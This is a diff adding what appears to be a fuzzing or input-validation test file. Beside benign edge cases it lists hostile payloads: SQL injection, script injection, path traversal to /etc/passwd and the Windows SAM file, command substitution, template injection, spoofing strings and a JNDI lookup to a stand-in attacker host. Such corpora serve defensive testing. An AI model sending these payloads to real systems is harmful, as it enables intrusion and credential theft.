@@ -1,0 +1,30 @@
+hello world
+test@example.com
+admin' OR '1'='1
+<script>alert(1)</script>
+../../../etc/passwd
+{\"key\": "value\"}
+\u200B\u200C\u200D
+‮evil‭
+аdministrator
+user@domain.com
+password123
+DROP TABLE users;
+<iframe src="javascript:alert(1)">
+$(whoami)
+{{7*7}}
+${jndi:ldap://evil.com}
+\x00\x00\x00
+A"B"C
+' OR '1'='1' --
+1; DROP TABLE users
+../../../../windows/system32/config/sam
+\xFF\xFE
+null
+undefined
+NaN
+Infinity
+-0
+0xdeadbeef
+\uFFFF
+🦀🦀🦀
